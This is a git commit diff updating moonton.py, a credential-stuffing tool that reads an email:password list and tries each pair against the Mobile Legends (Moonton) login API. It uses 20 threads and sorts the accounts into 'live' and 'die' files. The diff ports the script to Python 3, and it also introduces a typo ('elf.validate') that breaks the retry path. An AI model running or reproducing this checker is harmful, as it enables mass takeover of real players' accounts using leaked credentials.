5d48a5377bea4d5e35839664acb18f02a4bc545f
DulLah <52864765+dz-id@users.noreply.github.com>
2020-05-26 09:58:26 +0700

    Update moonton.py

--- moonton.py
+++ moonton.py
@@ -1,4 +1,3 @@
-#!usr/bin/python2.7
 # coding=utf-8
 
 ############################################################
@@ -8,33 +7,54 @@
 # Github         : https://github.com/dz-id                #
 # Facebook       : https://www.facebook.com/dulahz         #
 # Telegram       : https://t.me/unikers                    #
-# Python version : 2.7                                     #
+# Python version : 2.7 OR 3.7++                                     #
 # Web version    : https://dz-tools.my.id/moonton-checker/ #
 ############################################################
 
-import requests, os, sys, hashlib, json
-from multiprocessing.pool import ThreadPool
+import os, sys, hashlib, json
 
-if sys.version_info.major != 2:
-  exit('\n[WARNING] Gunakan python versi 2')
+try:
+  from concurrent.futures import ThreadPoolExecutor
+except ImportError:
+  if sys.version_info.major != 2:
+    os.system('pip install futures')
+    exit('Please restart this tools')
+  else:
+    os.system('pip2 install futures')
+    exit('Please restart this tools')
+try:
+  import requests
+except ImportError:
+  if sys.version_info.major != 2:
+    os.system('pip install requests')
+    exit('Please restart this tools')
+  else:
+    os.system('pip2 install requests')
+    exit('Please restart this tools')
+
+api = 'https://accountmtapi.mobilelegends.com/'
 
 class MOONTON:
-  def __init__(self):
+  def __init__(self, url):
     self.userdata = []
     self.live = []
     self.die = []
-    self.api = 'https://accountmtapi.mobilelegends.com/'
+    self.api = url
     print('''\033[0m
 
 |V| _  _ __ _|_ _ __    /  |_  _  _  |  _  __
 | |(_)(_)| | |_(_)| |   \__| |(/_(_  |<(/_ |
 ---------------------------------------------
           - Created By (DulLah) -
----------------------------------------------\n''')
+---------------------------------------------
+[#] Web version (https://dz-tools.my.id/moonton-checker)\n''')
 
   def main(self):
     print('[!] Pemisah email:password atau email|password\n')
-    empas = raw_input('[?] List empas (ex: list.txt): ')
+    if sys.version_info.major != 2:
+      empas = input('[?] List empas (ex: list.txt): ')
+    else:
+      empas = raw_input('[?] List empas (ex: list.txt): ')
     if os.path.exists(empas):
       for data in open(empas,'r').readlines():
         try:
@@ -50,29 +70,30 @@ class MOONTON:
             user = data.strip().split(':')
             if user[0] and user[1]:
               self.userdata.append({
-              'email': user[0],
-              'pw': user[1],
-              'userdata': data.strip()
-            })
+                'email': user[0],
+                'pw': user[1],
+                'userdata': data.strip()
+             })
           except: pass
       if len(self.userdata) == 0:
         exit('[!] Empas tidak ada atau tidak valid pastikan berformat email:pass atau email|pass')
       print('[*] Total {0} account\n'.format(str(len(self.userdata))))
-      ThreadPool(20).map(self.validate, self.userdata)
+      with ThreadPoolExecutor(max_workers=20) as thread:
+        [thread.submit(self.validate, user) for user in self.userdata]
       print('\n[#] LIVE: '+str(len(self.live))+' - saved: live.txt')
       print('[#] DIEE: '+str(len(self.die))+' - saved: die.txt')
       exit(0)
     else:
       print('[!] File tidak ditemukan "{0}"'.format(empas))
 
+  def hash_md5(self, string):
+    md5 = hashlib.new('md5')
+    md5.update(string.encode('utf-8'))
+    return md5.hexdigest()
+
   def build_params(self, user):
-    md5 = hashlib.new('md5')
-    md5.update(user['pw'].encode('utf-8'))
-    md5pwd = md5.hexdigest()
-    sign = 'account={0}&md5pwd={1}&op=login'.format(user['email'], md5pwd)
-    md5 = hashlib.new('md5')
-    md5.update(sign.encode('utf-8'))
-    hashed = md5.hexdigest()
+    md5pwd = self.hash_md5(user['pw'])
+    hashed = self.hash_md5('account={0}&md5pwd={1}&op=login'.format(user['email'], md5pwd))
     return json.dumps({
       'op': 'login',
       'sign': hashed,
@@ -88,15 +109,15 @@ class MOONTON:
       data = self.build_params(user)
       response = requests.post(self.api, data=data).json()
       if response['message'] == 'Error_Success':
-        print('[\033[92mLIVE\033[0m] '+user['userdata'])
+        print('\r[\033[92mLIVE\033[0m] '+user['userdata'])
         self.live.append(user['userdata'])
         open('live.txt','a').write(str(user['userdata'])+'\n')
       else:
-        print('[\033[91mDIEE\033[0m] '+user['userdata'])
+        print('\r[\033[91mDIEE\033[0m] '+user['userdata'])
         self.die.append(user['userdata'])
         open('die.txt','a').write(str(user['userdata'])+'\n')
     except:
-      self.validate(user)
+      elf.validate(user)
 
 if __name__ == '__main__':
-  (MOONTON().main())
+  (MOONTON(api).main())
